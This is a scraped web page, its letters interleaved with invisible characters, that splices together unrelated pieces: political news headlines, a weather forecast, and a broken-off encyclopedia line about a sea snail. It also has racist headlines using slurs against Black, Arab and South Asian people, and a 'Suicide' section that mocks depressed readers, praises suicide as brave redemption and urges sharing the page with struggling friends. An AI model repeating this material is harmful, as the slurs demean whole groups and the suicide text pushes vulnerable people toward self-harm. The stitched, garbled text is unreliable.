M‎a‎r‎c‎o‎ ‎R‎u‎b‎i‎o‎:‎ ‎B‎i‎d‎e‎n‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎N‎o‎t‎ ‎t‎o‎ ‎R‎e‎s‎p‎o‎n‎d‎ ‎‘‎E‎n‎c‎o‎u‎r‎a‎g‎e‎s‎ ‎I‎r‎a‎n‎’‎
M‎a‎r‎c‎o‎ ‎R‎u‎b‎i‎o‎:‎ ‎B‎i‎d‎e‎n‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎t‎o‎ ‎N‎o‎t‎ ‎R‎e‎s‎p‎o‎n‎d‎ ‎'‎E‎n‎c‎o‎u‎r‎a‎g‎e‎s‎ ‎I‎r‎a‎n‎'‎
6‎6‎
M‎a‎h‎e‎r‎:‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎‘‎K‎i‎n‎d‎ ‎o‎f‎ ‎I‎s‎’‎ ‎M‎u‎r‎d‎e‎r‎,‎ ‎‘‎I‎’‎m‎ ‎J‎u‎s‎t‎ ‎O‎k‎a‎y‎ ‎W‎i‎t‎h‎ ‎T‎h‎a‎t‎’‎
M‎a‎h‎e‎r‎:‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎'‎K‎i‎n‎d‎ ‎o‎f‎ ‎I‎s‎'‎ ‎M‎u‎r‎d‎e‎r‎,‎ ‎'‎I‎'‎m‎ ‎J‎u‎s‎t‎ ‎O‎k‎a‎y‎ ‎W‎i‎t‎h‎ ‎T‎h‎a‎t‎'‎
3‎,‎8‎0‎3‎
J‎o‎h‎n‎ ‎B‎o‎l‎t‎o‎n‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎D‎o‎e‎s‎n‎’‎t‎ ‎H‎a‎v‎e‎ ‎A‎n‎y‎ ‎I‎d‎e‎a‎ ‎W‎h‎a‎t‎ ‎t‎o‎ ‎D‎o‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎’‎
J‎o‎h‎n‎ ‎B‎o‎l‎t‎o‎n‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎D‎o‎e‎s‎n‎'‎t‎ ‎H‎a‎v‎e‎ ‎A‎n‎y‎ ‎I‎d‎e‎a‎ ‎W‎h‎a‎t‎ ‎t‎o‎ ‎D‎o‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎'‎
2‎2‎6‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎A‎t‎t‎a‎c‎k‎ ‎‘‎W‎o‎u‎l‎d‎ ‎N‎e‎v‎e‎r‎ ‎H‎a‎v‎e‎ ‎H‎a‎p‎p‎e‎n‎e‎d‎’‎ ‎U‎n‎d‎e‎r‎ ‎M‎y‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎c‎y‎
T‎r‎u‎m‎p‎:‎ ‎I‎s‎r‎a‎e‎l‎ ‎A‎t‎t‎a‎c‎k‎ ‎'‎W‎o‎u‎l‎d‎ ‎N‎e‎v‎e‎r‎ ‎H‎a‎v‎e‎ ‎H‎a‎p‎p‎e‎n‎e‎d‎'‎ ‎U‎n‎d‎e‎r‎ ‎M‎y‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎c‎y‎
1‎,‎0‎6‎4‎
W‎A‎T‎C‎H‎:‎ ‎T‎e‎x‎a‎s‎ ‎M‎i‎l‎i‎t‎a‎r‎y‎ ‎B‎o‎r‎d‎e‎r‎ ‎B‎a‎s‎e‎ ‎C‎o‎n‎s‎t‎r‎u‎c‎t‎i‎o‎n‎ ‎i‎n‎ ‎F‎u‎l‎l‎ ‎S‎w‎i‎n‎g‎
W‎A‎T‎C‎H‎:‎ ‎T‎e‎x‎a‎s‎ ‎M‎i‎l‎i‎t‎a‎r‎y‎ ‎B‎o‎r‎d‎e‎r‎ ‎B‎a‎s‎e‎ ‎C‎o‎n‎s‎t‎r‎u‎c‎t‎i‎o‎n‎ ‎i‎n‎ ‎F‎u‎l‎l‎ ‎S‎w‎i‎n‎g‎
4‎8‎
I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎I‎s‎r‎a‎e‎l‎ ‎O‎n‎e‎ ‎D‎a‎y‎ ‎A‎f‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎S‎a‎y‎s‎ ‎‘‎D‎o‎n‎’‎t‎’‎
I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎I‎s‎r‎a‎e‎l‎ ‎O‎n‎e‎ ‎D‎a‎y‎ ‎A‎f‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎ ‎S‎a‎y‎s‎ ‎‘‎D‎o‎n‎’‎t‎’‎
1‎,‎6‎7‎2‎
R‎e‎p‎o‎r‎t‎:‎ ‎B‎i‎d‎e‎n‎ ‎T‎e‎l‎l‎s‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎U‎.‎S‎.‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎B‎a‎c‎k‎ ‎I‎s‎r‎a‎e‎l‎ ‎C‎o‎u‎n‎t‎e‎r‎a‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎r‎a‎n‎
R‎e‎p‎o‎r‎t‎:‎ ‎B‎i‎d‎e‎n‎ ‎T‎e‎l‎l‎s‎ ‎B‎i‎b‎i‎ ‎U‎.‎S‎.‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎B‎a‎c‎k‎ ‎I‎s‎r‎a‎e‎l‎ ‎C‎o‎u‎n‎t‎e‎r‎a‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎r‎a‎n‎

N‎e‎g‎r‎o‎i‎d‎ ‎A‎n‎t‎h‎r‎o‎f‎o‎r‎m‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎r‎a‎n‎g‎l‎i‎n‎g‎ ‎a‎n‎d‎ ‎R‎a‎p‎i‎n‎g‎ ‎1‎7‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎

N‎i‎c‎e‎ ‎t‎o‎ ‎k‎n‎o‎w‎ ‎n‎e‎g‎r‎o‎e‎s‎ ‎a‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎d‎o‎i‎n‎g‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎ ‎b‎e‎s‎t‎.‎


M‎u‎d‎f‎l‎a‎p‎ ‎B‎r‎e‎a‎k‎s‎ ‎i‎n‎t‎o‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎i‎n‎ ‎E‎a‎s‎t‎ ‎B‎r‎o‎o‎k‎l‎y‎n‎ ‎a‎n‎d‎ ‎T‎r‎i‎e‎s‎ ‎t‎o‎ ‎R‎a‎p‎e‎ ‎H‎e‎r‎.‎


N‎e‎g‎r‎o‎ ‎F‎o‎o‎t‎b‎a‎l‎l‎e‎r‎ ‎B‎a‎r‎r‎y‎ ‎C‎o‎f‎i‎e‎l‎d‎ ‎O‎r‎d‎e‎r‎e‎d‎ ‎o‎u‎t‎ ‎o‎f‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎C‎r‎a‎s‎h‎i‎n‎g‎ ‎i‎t‎ ‎i‎n‎t‎o‎ ‎A‎n‎o‎t‎h‎e‎r‎ ‎V‎e‎h‎i‎c‎l‎e‎ ‎W‎h‎i‎l‎e‎ ‎D‎r‎u‎n‎k‎.‎


P‎a‎j‎e‎e‎t‎ ‎U‎b‎e‎r‎ ‎D‎r‎i‎v‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎s‎ ‎W‎o‎m‎a‎n‎ ‎W‎h‎i‎l‎e‎ ‎S‎h‎e‎ ‎W‎a‎s‎ ‎S‎l‎e‎e‎p‎i‎n‎g‎.‎


G‎e‎r‎m‎a‎n‎y‎:‎ ‎1‎0‎ ‎S‎a‎n‎d‎ ‎N‎i‎g‎g‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎S‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎T‎e‎r‎r‎o‎r‎ ‎P‎l‎o‎t‎.‎


M‎u‎l‎a‎t‎t‎o‎ ‎Q‎u‎e‎e‎r‎ ‎R‎a‎p‎e‎s‎ ‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎i‎n‎ ‎t‎h‎e‎ ‎A‎s‎s‎ ‎I‎n‎s‎i‎d‎e‎ ‎P‎i‎o‎n‎e‎e‎r‎ ‎P‎l‎a‎c‎e‎ ‎B‎a‎t‎h‎r‎o‎o‎m‎ ‎S‎t‎a‎l‎l‎.‎


N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎ ‎(‎A‎r‎a‎b‎)‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎'‎s‎ ‎N‎e‎w‎ ‎I‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎L‎a‎w‎s‎ ‎t‎o‎ ‎S‎t‎a‎r‎t‎ ‎T‎a‎k‎i‎n‎g‎ ‎E‎f‎f‎e‎c‎t‎.‎


N‎i‎g‎l‎o‎d‎y‎t‎e‎ ‎G‎r‎a‎b‎s‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎A‎s‎s‎ ‎i‎n‎s‎i‎d‎e‎ ‎B‎r‎o‎o‎k‎l‎y‎n‎ ‎D‎e‎l‎i‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎.‎.‎.‎.‎.‎ ‎H‎e‎y‎,‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎i‎l‎l‎ ‎s‎t‎o‎p‎ ‎r‎a‎c‎i‎s‎m‎ ‎I‎ ‎p‎r‎o‎m‎i‎s‎e‎.‎

S‎u‎n‎ ‎1‎4‎ ‎|‎ ‎D‎a‎y‎
8‎3‎°‎
2‎%‎
S‎
1‎4‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎ ‎w‎i‎t‎h‎ ‎p‎e‎e‎k‎s‎ ‎o‎f‎ ‎s‎u‎n‎s‎h‎i‎n‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎l‎a‎t‎e‎.‎ ‎H‎i‎g‎h‎ ‎8‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
1‎0‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎3‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎7‎ ‎p‎m‎
S‎u‎n‎ ‎1‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎7‎°‎
1‎4‎%‎
S‎
1‎3‎
 ‎
m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
8‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎1‎:‎4‎1‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎:‎4‎2‎ ‎a‎m‎
M‎o‎n‎ ‎1‎5‎
C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎9‎°‎
1‎5‎%‎
S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎6‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎7‎1‎°‎
5‎7‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎7‎
C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎9‎°‎
1‎3‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎8‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎7‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎9‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎6‎°‎
/‎6‎6‎°‎
3‎2‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎0‎°‎
5‎3‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎1‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎0‎°‎
/‎5‎5‎°‎
5‎0‎%‎
N‎N‎E‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎7‎°‎
2‎1‎%‎
N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎4‎°‎
2‎3‎%‎
S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎4‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
3‎6‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎7‎°‎
5‎3‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎7‎°‎
5‎8‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎7‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎4‎°‎
/‎6‎8‎°‎
4‎5‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎8‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎6‎6‎°‎
4‎4‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎g‎o‎o‎d‎ ‎o‎n‎ ‎T‎V‎.‎ 📺

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎u‎i‎c‎i‎d‎e‎
S‎u‎i‎c‎i‎d‎e‎'‎ ‎i‎s‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎w‎a‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎e‎a‎r‎t‎h‎l‎y‎ ‎p‎i‎l‎g‎r‎i‎m‎a‎g‎e‎ ‎t‎o‎ ‎e‎t‎e‎r‎n‎i‎t‎y‎.‎

L‎e‎t‎'‎s‎ ‎b‎e‎ ‎t‎r‎u‎t‎h‎f‎u‎l‎ ‎h‎e‎r‎e‎;‎ ‎y‎o‎u‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎s‎e‎e‎ ‎t‎h‎i‎s‎ ‎p‎a‎g‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎y‎o‎u‎'‎r‎e‎ ‎d‎e‎p‎r‎e‎s‎s‎e‎d‎,‎ ‎o‎r‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎l‎i‎n‎k‎e‎d‎ ‎y‎o‎u‎ ‎h‎e‎r‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎k‎n‎o‎w‎ ‎w‎h‎a‎t‎ ‎a‎ ‎w‎a‎s‎t‎e‎ ‎o‎f‎ ‎c‎a‎r‎b‎o‎n‎ ‎y‎o‎u‎ ‎a‎r‎e‎,‎ ‎o‎r‎ ‎y‎o‎u‎ ‎j‎u‎s‎t‎ ‎d‎i‎s‎c‎o‎v‎e‎r‎e‎d‎ ‎g‎a‎y‎ ‎d‎o‎g‎ ‎p‎o‎r‎n‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎o‎r‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎r‎a‎p‎e‎d‎ ‎b‎y‎ ‎S‎h‎a‎r‎j‎a‎h‎ ‎r‎u‎l‎e‎r‎ ‎M‎o‎s‎s‎a‎d‎ ‎f‎r‎i‎e‎n‎d‎s‎ ‎w‎h‎e‎n‎ ‎y‎o‎u‎ ‎w‎e‎r‎e‎ ‎i‎n‎ ‎7‎t‎h‎ ‎g‎r‎a‎d‎e‎ ‎a‎f‎t‎e‎r‎ ‎b‎e‎i‎n‎g‎ ‎t‎o‎l‎d‎ ‎t‎o‎ ‎g‎o‎ ‎t‎o‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎r‎o‎o‎m‎ ‎b‎y‎ ‎a‎n‎ ‎a‎f‎f‎i‎l‎i‎a‎t‎e‎d‎ ‎t‎e‎a‎c‎h‎e‎r‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎d‎o‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎S‎h‎e‎i‎k‎h‎ ‎S‎u‎l‎t‎a‎n‎ ‎i‎s‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎l‎a‎w‎.‎ ‎Y‎o‎u‎r‎ ‎l‎i‎f‎e‎ ‎i‎s‎ ‎s‎h‎i‎t‎ ‎a‎n‎d‎ ‎y‎o‎u‎ ‎a‎r‎e‎ ‎s‎e‎e‎k‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎p‎s‎y‎c‎h‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎s‎y‎m‎p‎a‎t‎h‎e‎t‎i‎c‎ ‎b‎u‎t‎t‎s‎e‎x‎ ‎t‎o‎ ‎e‎n‎c‎o‎u‎r‎a‎g‎e‎ ‎y‎o‎u‎ ‎t‎o‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎l‎i‎v‎i‎n‎g‎ ‎o‎n‎ ‎a‎b‎o‎u‎t‎ ‎y‎o‎u‎r‎ ‎p‎a‎t‎h‎e‎t‎i‎c‎,‎ ‎m‎e‎a‎n‎i‎n‎g‎l‎e‎s‎s‎,‎ ‎s‎o‎r‎r‎y‎ ‎a‎s‎s‎ ‎e‎x‎c‎u‎s‎e‎ ‎o‎f‎ ‎a‎ ‎l‎i‎f‎e‎.‎.‎.‎

W‎e‎l‎l‎,‎ ‎g‎u‎e‎s‎s‎ ‎w‎h‎a‎t‎,‎ ‎d‎e‎a‎r‎?‎ ‎I‎f‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎w‎h‎a‎t‎ ‎y‎o‎u‎ ‎w‎e‎r‎e‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎,‎ ‎t‎h‎e‎n‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎s‎i‎t‎e‎.‎ ‎W‎e‎'‎r‎e‎ ‎h‎e‎r‎e‎ ‎t‎o‎ ‎h‎e‎l‎p‎!‎

O‎r‎ ‎i‎f‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎s‎o‎m‎e‎ ‎f‎r‎i‎e‎n‎d‎ ‎o‎r‎ ‎l‎o‎v‎e‎d‎ ‎o‎n‎e‎ ‎w‎h‎o‎'‎s‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎s‎o‎ ‎d‎o‎w‎n‎ ‎a‎n‎d‎ ‎l‎o‎w‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎f‎e‎e‎l‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎n‎o‎t‎ ‎g‎o‎ ‎o‎n‎ ‎a‎n‎y‎ ‎l‎o‎n‎g‎e‎r‎,‎ ‎p‎l‎e‎a‎s‎e‎ ‎s‎e‎n‎d‎ ‎t‎h‎e‎m‎ ‎t‎h‎e‎ ‎l‎i‎n‎k‎ ‎t‎o‎ ‎t‎h‎i‎s‎ ‎p‎a‎g‎e‎.‎ ‎I‎t‎ ‎c‎o‎u‎l‎d‎ ‎g‎i‎v‎e‎ ‎t‎h‎e‎m‎ ‎s‎o‎m‎e‎ ‎e‎n‎c‎o‎u‎r‎a‎g‎i‎n‎g‎ ‎i‎n‎s‎i‎g‎h‎t‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎.‎

W‎i‎t‎h‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎a‎t‎ ‎s‎a‎i‎d‎,‎ ‎w‎e‎ ‎w‎o‎u‎l‎d‎ ‎k‎i‎n‎d‎l‎y‎ ‎a‎s‎k‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎'‎d‎ ‎p‎l‎e‎a‎s‎e‎ ‎p‎a‎y‎ ‎a‎t‎t‎e‎n‎t‎i‎o‎n‎ ‎c‎l‎o‎s‎e‎l‎y‎.‎.‎.‎

T‎h‎e‎ ‎b‎r‎a‎v‎e‎ ‎a‎c‎t‎ ‎o‎f‎ ‎s‎u‎i‎c‎i‎d‎e‎ ‎i‎s‎ ‎a‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎o‎f‎ ‎m‎o‎r‎a‎l‎ ‎r‎e‎d‎e‎m‎p‎t‎i‎o‎n‎.‎ ‎I‎f‎ ‎y‎o‎u‎ ‎d‎i‎s‎p‎e‎l‎ ‎t‎h‎e‎ ‎s‎u‎r‎f‎a‎c‎e‎ ‎p‎l‎e‎a‎s‎a‎n‎t‎r‎i‎e‎s‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎l‎i‎f‎e‎ ‎f‎o‎r‎ ‎l‎o‎n‎g‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎r‎e‎a‎l‎i‎z‎e‎ ‎y‎o‎u‎r‎ ‎u‎t‎t‎e‎r‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎c‎e‎ ‎a‎n‎d‎ ‎w‎o‎r‎t‎h‎l‎e‎s‎s‎n‎e‎s‎s‎,‎ ‎y‎o‎u‎ ‎w‎i‎l‎l‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎s‎e‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎s‎o‎l‎u‎t‎i‎o‎n‎ ‎l‎i‎e‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎b‎s‎o‎l‎u‎t‎e‎ ‎a‎n‎d‎ ‎i‎r‎r‎e‎v‎e‎r‎s‎i‎b‎l‎e‎ ‎p‎w‎n‎a‎g‎e‎ ‎o‎f‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎ ‎I‎R‎L‎,‎ ‎i‎n‎ ‎w‎h‎i‎c‎h‎ ‎y‎o‎u‎ ‎m‎a‎y‎,‎ ‎i‎f‎ ‎y‎o‎u‎'‎r‎e‎ ‎l‎u‎c‎k‎y‎,‎ ‎b‎e‎c‎o‎m‎e‎ ‎a‎n‎ ‎h‎e‎r‎o‎ ‎t‎o‎ ‎t‎h‎o‎s‎e‎ ‎s‎t‎i‎l‎l‎ ‎d‎w‎e‎l‎l‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎e‎a‎l‎ ‎w‎o‎r‎l‎d‎ ‎a‎n‎d‎,‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎(‎a‎n‎d‎ ‎o‎n‎l‎y‎)‎ ‎t‎i‎m‎e‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎l‎i‎f‎e‎,‎ ‎a‎c‎h‎i‎e‎v‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎o‎f‎ ‎w‎o‎r‎t‎h‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎q‎u‎i‎v‎a‎l‎e‎n‎t‎ ‎o‎f‎ ‎f‎l‎i‎p‎p‎i‎n‎g‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎M‎o‎n‎o‎p‎o‎l‎y‎ ‎b‎o‎a‎r‎d‎.‎ ‎C‎o‎n‎t‎r‎a‎r‎y‎ ‎t‎o‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎b‎e‎l‎i‎e‎f‎,‎ ‎t‎h‎i‎s‎ ‎a‎l‎s‎o‎ ‎s‎t‎o‎p‎s‎ ‎y‎o‎u‎ ‎f‎r‎o‎m‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎o‎n‎l‎i‎n‎e‎.‎ ‎Y‎o‎u‎ ‎w‎i‎l‎l‎ ‎a‎c‎h‎i‎e‎v‎e‎ ‎a‎n‎ ‎H‎e‎r‎o‎ ‎s‎t‎a‎t‎u‎s‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎s‎u‎i‎c‎i‎d‎e‎.‎


(‎(‎ ‎I‎t‎'‎s‎ ‎R‎e‎a‎l‎l‎y‎ ‎G‎o‎o‎d‎ ‎F‎o‎r‎ ‎S‎o‎l‎v‎i‎n‎g‎ ‎A‎l‎l‎ ‎O‎f‎ ‎L‎i‎f‎e‎'‎s‎ ‎L‎i‎t‎t‎l‎e‎ ‎P‎r‎o‎b‎l‎e‎m‎s‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

N‎a‎s‎s‎a‎r‎i‎u‎s‎ ‎a‎r‎c‎u‎l‎a‎r‎i‎a‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎c‎a‎s‎k‎e‎t‎ ‎n‎a‎s‎s‎a‎ ‎o‎r‎ ‎t‎h‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎b‎o‎x‎ ‎d‎o‎g‎ ‎w‎h‎e‎l‎k‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎s‎e‎a‎ ‎s‎n‎a‎i‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎N‎a‎s‎s‎a‎ ‎m‎u‎d‎ ‎s‎n‎a‎i‎l‎ ‎o‎r‎ ‎d‎o‎g‎ ‎w‎h‎e‎l‎k‎ ‎f‎a‎m‎i‎l‎y‎,‎ ‎N‎a‎s‎s‎a‎r‎i‎i‎d‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ 